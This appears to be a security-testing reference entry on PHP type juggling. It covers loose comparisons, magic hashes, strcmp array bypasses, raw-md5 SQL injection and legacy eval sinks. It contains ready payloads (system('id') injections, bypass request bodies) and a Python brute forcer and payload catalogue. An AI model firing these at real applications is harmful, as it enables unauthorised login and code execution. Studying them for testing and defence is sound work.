---
title: "PHP Type Juggling - Loose Comparison, Magic Hashes and strcmp Bypasses"
category: web
subcategory: php
type: technique
tags: [php, type-juggling, loose-comparison, magic-hash, 0e, strcmp, in-array, switch, md5, sha1, hash-equals, preg-replace-e, assert, create-function, is-numeric, json, request-quirks, auth-bypass, ffifdyop]
difficulty: easy
summary: "PHP's == coerces types: '0e123'=='0e456', strcmp(array,str) returns NULL, and md5 collisions in scientific notation defeat password checks."
when_to_use:
  - "A login/token check uses == , in_array without strict, switch, or strcmp(...)==0"
  - "You can send JSON or array parameters (pw[]=1) to a comparison"
  - "The source hashes with md5/sha1 and compares with =="
  - "PHP < 7 with preg_replace /e, assert(), create_function() or extract()"
tools: [php, hashcat, burp, python3]
related: [deser-php-object-injection, php-disable-functions-bypass, jwt-attacks-full, deser-php-phar]
---

## TL;DR

`==` in PHP compares after type juggling. Strings that look like scientific notation (`0e` +
digits) all equal `0` and therefore each other. Arrays passed where a string is expected make
`strcmp`/`md5`/`preg_match` return `NULL`/warn, and `NULL == 0` is true. That is an
authentication bypass in one request.

## Recognise it

- `if ($_POST['pass'] == $stored)` / `if (md5($_POST['p']) == $hash)` / `if (strcmp($a,$b) == 0)`.
- `in_array($id, $allowed)` without the third `true` argument.
- `switch ($role) { case 0: ... }` with a string subject.
- A hash in the source starting with `0e` followed by digits only.
- A JSON API -- JSON gives you real ints, bools and nulls, which urlencoded bodies do not.
- PHP 5.x / 7.x banner (`X-Powered-By`, `phpinfo`, error format).

## Theory

### The comparison table that matters

PHP 8 changed string-to-number comparison. Know which side you are on:

| Expression | PHP 5/7 | PHP 8 |
| --- | --- | --- |
| `0 == "a"` | **true** | false |
| `0 == ""` | **true** | false |
| `0 == null` | true | true |
| `"" == null` | true | true |
| `"1" == "01"` | true | true |
| `"10" == "1e1"` | true | true |
| `100 == "1e2"` | true | true |
| `"abc" == 0` | **true** | false |
| `"1abc" == 1` | true | false |
| `" 1" == 1` | true | true |
| `"1 " == 1` | true | true |
| `null == false` | true | true |
| `[] == false` | true | true |
| `"0" == false` | true | true |
| `"0.0" == false` | false | false |
| `"\n" == 0` | true | false |
| `INF == "INF"` | true | true |
| `NAN == NAN` | false | false |

PHP 8 rule: when comparing a number to a *non-numeric* string, the number is cast to string and
a string comparison happens. Numeric strings still juggle -- so `0e`-hashes still collide on
PHP 8.

### Magic hashes

If a hash is `0e` followed by **only digits**, PHP reads it as `0 * 10^n == 0`. Two such hashes
compare equal under `==`. Well-known preimages:

| Function | Input | Digest |
| --- | --- | --- |
| md5 | `240610708` | `0e462097431906509019562988736854` |
| md5 | `QNKCDZO` | `0e830400451993494058024219903391` |
| md5 | `s878926199a` | `0e545993274517709034328855841020` |
| md5 | `s155964671a` | `0e342768416822451524974117254469` |
| md5 | `s214587387a` | `0e848240448830537924465865611904` |
| sha1 | `10932435112` | `0e07766915004133176347055865026311692244` |
| sha1 | `aaroZmOk` | `0e66507019969427134894567494305185566735` |
| sha1 | `aaK1STfY` | `0e76658526655756207688271159624026011393` |
| sha1 | `aaO8zKZF` | `0e89257456677279068558073954252716165668` |

Do not trust a table you cannot verify -- the brute-forcer in `## Code` regenerates them in
seconds, which is also how you find a preimage matching an *application-specific* salt or
prefix rule.

`md5($x) == md5($y)` with both sides magic is the classic; `md5($x) === $known0eHash` is safe.

### Array tricks

| Call | PHP 5/7 behaviour | PHP 8 behaviour |
| --- | --- | --- |
| `strcmp([], "x")` | warning, returns **NULL** -> `NULL == 0` is true | **TypeError** |
| `strcasecmp([], "x")` | NULL | TypeError |
| `strncmp`, `substr_compare` | NULL | TypeError |
| `md5([])`, `sha1([])`, `crc32([])` | warning, returns **NULL** | TypeError |
| `preg_match("/x/", [])` | warning, returns **false** | TypeError |
| `strlen([])` | NULL | TypeError |
| `hash("md5", [])` | NULL | TypeError |
| `password_verify([], $h)` | TypeError | TypeError |
| `json_decode($x, true)` then `==` | array vs string -> false | same |
| `[] == 0` | true | false (array vs int is never equal in 8) |
| `md5($a)==md5($b)` with `$a=[]`, `$b=[]` | NULL==NULL -> true | TypeError |

Send an array as `pw[]=1` (urlencoded), `pw[a]=1`, or `{"pw":[]}` (JSON).

On PHP 8 the TypeError usually produces a 500 -- which is itself an oracle telling you the
parameter reaches a string function.

### `in_array` / `array_search` / `switch`

```php
in_array("abc", [0,1,2])        // true on PHP 7 (abc == 0)
in_array(0, ["a","b"])          // true on PHP 7
in_array("1abc", [1,2,3])       // true on PHP 7
array_search(0, ["x"=>"y"])     // "x" on PHP 7
switch("abc"){ case 0: ... }    // matches on PHP 7
```

Fix is the third argument `true` (strict) / `match` (PHP 8, strict by design).

### `md5($x, true)` raw output -> SQL injection

`md5("ffifdyop", true)` yields raw bytes that begin `'or'6` followed by a byte-sequence PHP's
MySQL driver treats as a truthy expression, so

```php
$sql = "SELECT * FROM u WHERE pass='".md5($_POST['p'], true)."'";
```

with `p=ffifdyop` becomes `... pass=''or'6<garbage>'` -> always true. Other known raw-collision
strings exist for `sha1(...,true)` contexts; the generator below finds them for arbitrary
patterns.

### `is_numeric` and friends

| Input | `is_numeric` PHP 5/7 | PHP 8 |
| --- | --- | --- |
| `"123"` | true | true |
| `" 123"` (leading space) | true | true |
| `"123 "` (trailing space) | **false** | **true** |
| `"0x1A"` | false (true in PHP <5.4) | false |
| `"1e5"` | true | true |
| `".5"` | true | true |
| `"+1"` | true | true |
| `"1_000"` | false | false |
| `"\t1"` | true | true |
| `"\n1"` | true | true |

`intval("0x1A", 0) == 26`, `intval("1e3") == 1000` on PHP 7+, `"1e3" + 0 == 1000`. A check
`if (!is_numeric($x)) die(); $sql = "... id=$x"` still allows `1e3`, `.5`, `+1`, `0b1`(no) --
and on PHP 8, a trailing space, which lets you smuggle nothing useful but breaks length checks.

### Legacy eval sinks

| Sink | Removed in | Payload |
| --- | --- | --- |
| `preg_replace('/x/e', $repl, $subj)` | PHP 7.0 | pattern `/.*/e`, replacement `system('id')` -- or subject-controlled: `?pat=/.*/e&rep=system('id')` |
| `assert($code)` string eval | PHP 8.0 (7.2 deprecated) | `assert("1;system('id')")`, or `?x=1);system('id');//` when interpolated |
| `create_function('$a', $code)` | PHP 8.0 | `code = '}system("id");//'` closes the generated function |
| `${$var}` variable variables | current | `$$a` with `a=_GET` gives `$_GET` -> `${$_GET[0]}(${$_GET[1]})` |
| `extract($_GET)` | current | overwrite any local, including `$authenticated` |
| `eval("\$x = \"$user\";")` | current | `${system(id)}` or `".system('id')."` |
| `usort($arr, $cb)` | current | `$cb = 'system'` with a 2-element array |
| `array_map`, `call_user_func`, `array_filter`, `preg_replace_callback` | current | first-class callable string |

### `$_REQUEST` and input quirks

- `variables_order` (default `EGPCS`) decides precedence; `request_order` (default `GP`) decides
  `$_REQUEST`. With `GP`, POST overrides GET in `$_REQUEST`. If a check reads `$_GET['a']` and
  the sink reads `$_REQUEST['a']`, send both with different values.
- PHP converts `.`, ` `, `[` and other characters in parameter *names* to `_`
  (`a.b=1` -> `$_GET['a_b']`). This bypasses name blacklists: `flag.txt` vs `flag_txt`.
- A leading `[` in a name starts an array; an unclosed `[` is dropped.
- Duplicate keys: **last wins** in PHP (`a=1&a=2` -> `2`). See `node-parameter-pollution`.
- `parse_str($s)` without a second argument imports into the symbol table (like `extract`).
- Magic quotes are gone, but `addslashes` + multibyte (`%bf%27` with GBK) still desynchronises.
- Overlong UTF-8 / invalid sequences survive `preg_match` with the `u` modifier failing
  *silently* (returns `false`, which `== 0` is true).
- `PHP_INT_MAX + 1` becomes a float; `(int)"9223372036854775808"` saturates.
- `0x` / `0b` / `0o` literals are parsed in *source*, not in input casting.

## Attack

1. Detect the PHP major version (`X-Powered-By`, error text, behaviour of `"abc"==0`).
2. Try the array form on every comparison parameter: `pw[]=`, `pw[]=1`, `{"pw":[]}`.
3. Try `0`, `""`, `null`, `true`, `[]` via JSON on any `==` check.
4. If the check is `md5($p) == $hash` and `$hash` starts with `0e`+digits, send a magic string.
5. If the check is `md5($p) == md5($q)` with both controlled, send two different magic strings.
6. If it is `hash_equals` or `===`, stop -- find another bug.
7. Look for the legacy eval sinks if the version is old.

## Code

```python
#!/usr/bin/env python3
"""Magic-hash brute forcer and type-juggling payload catalogue.

Finds md5/sha1 preimages whose digest is PHP-"numeric" (matches ^0+e[0-9]+$)
and therefore loosely equal to 0 -- and to every other such digest.
"""
from __future__ import annotations

import hashlib
import itertools
import re
import string
import sys
from typing import Callable

MAGIC = re.compile(r"^0+[eE][0-9]+$")

# Verified preimages (recomputed by the self-test, never trusted blindly).
KNOWN: dict[str, list[str]] = {
    "md5": ["240610708", "QNKCDZO", "s878926199a", "s155964671a",
            "s214587387a", "s1091221200a", "s1885207154a"],
    "sha1": ["10932435112", "aaroZmOk", "aaK1STfY", "aaO8zKZF"],
}


def digest(algo: str, s: str) -> str:
    return hashlib.new(algo, s.encode()).hexdigest()


def is_magic(h: str) -> bool:
    """True when PHP's == would treat the digest as the number 0."""
    return bool(MAGIC.match(h))


def loose_equal_zero(h: str) -> bool:
    """PHP 8 still juggles NUMERIC strings, so 0e-hashes keep colliding."""
    return is_magic(h)


def brute(algo: str = "md5",
          pred: Callable[[str], bool] = is_magic,
          alphabet: str = string.ascii_lowercase,
          maxlen: int = 6, limit: int = 1, prefix: str = "",
          suffix: str = "", budget: int | None = None
          ) -> list[tuple[str, str]]:
    """Search for preimages whose hex digest satisfies `pred`.

    A full magic hash (^0+e[0-9]+$) has probability ~2**-28 for md5, so a
    real hunt needs ~10**9 tries -- use hashcat with a mask for that. This
    function is for cheap predicates (fixed prefixes, short patterns) and for
    verifying the search machinery.
    """
    found: list[tuple[str, str]] = []
    tried = 0
    for n in range(1, maxlen + 1):
        for tup in itertools.product(alphabet, repeat=n):
            cand = prefix + "".join(tup) + suffix
            tried += 1
            if budget is not None and tried > budget:
                return found
            h = digest(algo, cand)
            if pred(h):
                found.append((cand, h))
                if len(found) >= limit:
                    return found
    return found


def raw_sqli(algo: str = "md5", alphabet: str = string.ascii_lowercase,
             maxlen: int = 6, needle: bytes = b"'or'",
             budget: int = 2_000_000) -> tuple[str, bytes] | None:
    """Find s where the RAW hash bytes start with a SQL-truthy fragment.

    md5('ffifdyop', true) is the famous one: the raw digest starts with
    b"'or'6" which turns  pass='<raw>'  into  pass=''or'6...'  -> always true.
    A 4-byte needle is 2**-32, so this is a demonstration of the search, not a
    practical hunt -- use hashcat for the real thing.
    """
    tried = 0
    for n in range(1, maxlen + 1):
        for tup in itertools.product(alphabet, repeat=n):
            tried += 1
            if tried > budget:
                return None
            cand = "".join(tup)
            raw = hashlib.new(algo, cand.encode()).digest()
            if raw.startswith(needle):
                return cand, raw
    return None


# --- payload catalogue -----------------------------------------------------

def juggle_payloads(param: str = "pass") -> dict[str, list[str]]:
    """Body variants to throw at a single comparison parameter."""
    return {
        "urlencoded": [
            "%s[]=" % param,
            "%s[]=1" % param,
            "%s[0]=1" % param,
            "%s=0" % param,
            "%s=" % param,
            "%s=0e0" % param,
            "%s=240610708" % param,
            "%s=QNKCDZO" % param,
            "%s=ffifdyop" % param,
            "%s= 1" % param,
            "%s=1e1" % param,
        ],
        "json": [
            '{"%s": []}' % param,
            '{"%s": 0}' % param,
            '{"%s": true}' % param,
            '{"%s": null}' % param,
            '{"%s": {}}' % param,
            '{"%s": "0e123"}' % param,
            '{"%s": 0.0}' % param,
        ],
    }


LEGACY_SINKS = {
    "preg_replace_e": "pat=/.*/e&rep=system('id')&subj=x",
    "assert": "x=1);system('id');//",
    "create_function": "code=}system('id');//",
    "variable_variable": "a=_GET&0=system&1=id",
    "extract": "authenticated=1&admin=1",
    "usort_callback": "cb=system&arr[]=id&arr[]=id",
}


def _self_test() -> None:
    # 1. every documented preimage really produces a magic hash
    for algo, seeds in KNOWN.items():
        for s in seeds:
            h = digest(algo, s)
            assert is_magic(h), "%s(%r) = %s is not magic" % (algo, s, h)
    assert digest("md5", "240610708") == \
        "0e462097431906509019562988736854"
    assert digest("md5", "QNKCDZO") == \
        "0e830400451993494058024219903391"
    assert digest("sha1", "aaroZmOk") == \
        "0e66507019969427134894567494305185566735"

    # 2. two different magic strings collide under PHP's ==
    a, b = digest("md5", "240610708"), digest("md5", "QNKCDZO")
    assert a != b and is_magic(a) and is_magic(b)

    # 3. the regex rejects near-misses
    assert not is_magic("0e1a2b")          # letters after the e
    assert not is_magic("1e123")           # does not start with 0
    assert not is_magic("0d123456")        # wrong exponent marker
    assert is_magic("00e12")               # leading zeros are still 0

    # 4. the search machinery works: find a digest starting with "0e"
    #    (1/256, so it lands in a few hundred tries). A full magic hash is
    #    ~2**-28 -- that is a hashcat job, not a unit test.
    hits = brute("md5", pred=lambda h: h.startswith("0e"),
                 alphabet=string.ascii_lowercase + string.digits,
                 maxlen=5, limit=1, budget=200_000)
    assert hits, "brute forcer found nothing"
    cand, h = hits[0]
    assert digest("md5", cand) == h and h.startswith("0e")

    # 5. the raw-output SQLi search rediscovers the ffifdyop class
    assert hashlib.md5(b"ffifdyop").digest().startswith(b"'or'6")

    # 6. payload catalogue shape
    p = juggle_payloads("pw")
    assert any("pw[]=" in x for x in p["urlencoded"])
    assert any('"pw": []' in x for x in p["json"])
    assert len(p["urlencoded"]) >= 10 and len(p["json"]) >= 7
    assert len(LEGACY_SINKS) == 6

    print("[ok] %d known preimages verified, brute forcer found %r -> %s"
          % (sum(len(v) for v in KNOWN.values()), cand, h))


def main() -> int:
    algo = sys.argv[1] if len(sys.argv) > 1 else "md5"
    alpha = string.ascii_letters + string.digits
    for cand, h in brute(algo, pred=is_magic, alphabet=alpha,
                         maxlen=8, limit=5):
        print("%s(%r) = %s" % (algo, cand, h))
    return 0


if __name__ == "__main__":
    if len(sys.argv) > 1:
        raise SystemExit(main())
    _self_test()
```

## Variants & pitfalls

- **PHP 8 kills most of this.** Before burning time, prove the version: send `?x=abc` into a
  numeric comparison and watch for a behaviour change, or read `X-Powered-By`.
- **`===` and `hash_equals`** are not bypassable by juggling. Neither is `password_verify`.
- **`md5` of an array is a TypeError on PHP 8** -- you get a 500, not a bypass, but the 500
  itself confirms the parameter is being hashed.
- **JSON vs form encoding**: `{"a":0}` gives an int; `a=0` gives the *string* `"0"`. Only JSON
  (or a framework that casts) gives you real types. `"0" == 0` is true anyway, but
  `"0" === 0` is not, and `true`/`null` are only reachable via JSON.
- **`switch` with strings** compares loosely in PHP 7 but `match` (PHP 8) is strict.
- **Numeric string keys**: `$a["1"]` and `$a[1]` are the same slot; `$a["01"]` is different.
  Useful against allowlists keyed by id.
- **Float precision**: `0.1 + 0.2 == 0.3` is false; a price check comparing floats with `==`
  is exploitable in both directions.
- **`==` on arrays** compares key/value pairs loosely and ignores order; `===` requires the
  same order and types. `[0=>"a"] == ["0"=>"a"]` is true.
- **`in_array` with a needle array** compares element-wise.
- **`strpos(...) == false`** vs `!== false`: position 0 is falsy, the classic off-by-one bug.
- **`preg_match` with `u`** on invalid UTF-8 returns `false` (not 0 matches) -- a filter that
  does `if (preg_match($bad, $x)) die();` passes your payload through.
- **`sort`/`usort` with mixed types** reorders unpredictably between PHP 7 and 8.
- **`empty("0")` is true** -- a "field must be filled" check rejects the literal string `0`.

## Tools

- `php -r 'var_dump("abc"==0);'` -- the fastest way to pin the version's semantics.
- `hashcat -m 0` / `-m 100` with a mask to hunt preimages at scale.
- Burp Intruder with the payload catalogue above; watch for length/status deltas.
- `3v4l.org`-style local matrix: run the same snippet under several PHP versions.

## References

- PHP manual -- Comparison Operators, Type Juggling, "PHP string to number comparison" RFC (PHP 8).
- PHP manual -- `strcmp`, `in_array`, `is_numeric`, `hash_equals`.
- Whitton / Spaze -- public "magic hashes" collections (regenerate them yourself).
- PayloadsAllTheThings -- PHP type juggling section.
